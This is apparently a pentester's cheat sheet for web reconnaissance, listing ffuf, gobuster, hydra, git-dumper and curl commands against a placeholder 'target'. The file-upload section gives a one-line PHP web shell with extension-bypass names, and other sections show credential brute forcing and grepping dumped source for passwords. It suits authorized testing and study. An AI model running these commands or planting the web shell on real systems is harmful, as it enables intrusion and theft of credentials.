
> Fast checklist for web reconnaissance and vulnerability discovery. Focus on speed, coverage and hidden attack surface.

---

## Initial Recon

```bash
curl -I http://target.com                     # Check headers (server, tech stack)
whatweb http://target.com                    # Fast tech fingerprinting
```

```http
Server: Apache/2.4.52
X-Powered-By: PHP/8.1
```

```bash
wappalyzer http://target.com                 # Alternative fingerprinting
```

---

## Directory & File Discovery
**Basic directory fuzzing with various wordlists:**
```bash
ffuf -u http://target/FUZZ -w wordlist.txt   

ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 

ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
```

**Hidden dot directories (.git, .env):**
```bash
ffuf -u http://target/.FUZZ -w wordlist.txt  

ffuf -u http://target/.FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 

ffuf -u http://target/.FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
```

**Enumerate various possible extensions:**
```bash
gobuster dir -u http://target -w wordlist.txt -x php,txt,html   
```

**ecursive  enumeration:**
```bash
feroxbuster -u http://target -r             

ffuf -u http://target/FUZZ -w wordlist.txt -recursion -recursion-depth 2                            
```

---

## Subdomain Enumeration

```bash
ffuf -w subdomains.txt -u http://FUZZ.target.com
```

```bash
gobuster dns -d target.com -w subdomains.txt
```

---

## Virtual Host Discovery

```bash
ffuf -w subdomains.txt -u http://target.com -H "Host: FUZZ.target.com"

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://target.com -H 'Host: FUZZ.target.com'
```

```bash
gobuster vhost -u http://target.com -w subdomains.txt

gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

---

## Parameter Discovery

```bash
ffuf -u "http://target/page.php?FUZZ=test" -w params.txt

ffuf -u "http://target/page.php?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

```bash
ffuf -u http://target -X POST -d "FUZZ=test" -w params.txt
```

---

## Request Analysis

```bash
curl -X OPTIONS http://target.com -i        # Allowed HTTP methods
```

```bash
curl -X TRACE http://target.com -i          # Check TRACE enabled (XST risk)
```

```bash
nmap -p80,443 --script http-methods target
```

---

## API Enumeration

```bash
ffuf -u http://api.target.com/FUZZ -w api.txt
```

```bash
curl http://target/api/v1/users             # Common endpoint pattern
```

```bash
curl http://target/api/v1/user/1            # Test IDOR manually
```

---

## JavaScript Recon

```bash
wget http://target/app.js                   # Download JS files
```

```bash
grep -E "api|token|key|http" app.js         # Extract endpoints/secrets
```

```bash
cat app.js | less                            # Manual review (important)
```

---

## Authentication Testing

```bash
hydra -L users.txt -P passwords.txt target http-post-form
```

```bash
jwt-tool token                               # Analyze JWT structure
```

```bash
echo "token" | cut -d "." -f2 | base64 -d    # Decode JWT payload
```

---

## File Upload Testing

```text
shell.php.jpg
shell.phtml
shell.php%00.jpg
```

```php
<?php system($_GET['cmd']); ?>
```

```bash
curl -F "file=@shell.php" http://target/upload
```

---

## Source Code Exposure

```bash
git-dumper http://target/.git/ dump/
```

```bash
grep -ri "password" .
grep -ri "secret" .
```

```bash
find . -name ".env"
```

---

## Sensitive Files

```bash
ffuf -u http://target/FUZZ -w wordlist.txt -e .bak,.old,.zip,.tar,.sql
```

```text
/.git/
/.env
/config.php
/backup.zip
/database.sql
```

---

## HTTP Headers Check

```bash
curl -I http://target.com
```

Check missing protections:

```text
X-Frame-Options
CSP
HttpOnly
Secure
SameSite
```

---

## Source Code (View Page Source)

```text
CTRL + U                                  # View page source (browser)
Right click → View Page Source            # Alternative access
```

Extract Hidden Endpoints

```html
<!-- /admin/login.php -->
<!-- TODO: remove debug endpoint /test.php -->
```


---
## Common Entry Points Checklist

- /admin
    
- /login
    
- /dashboard
    
- /api
    
- /.git
    
- /.env
    
- /backup
    
- /upload
    
- /test
    
- /dev
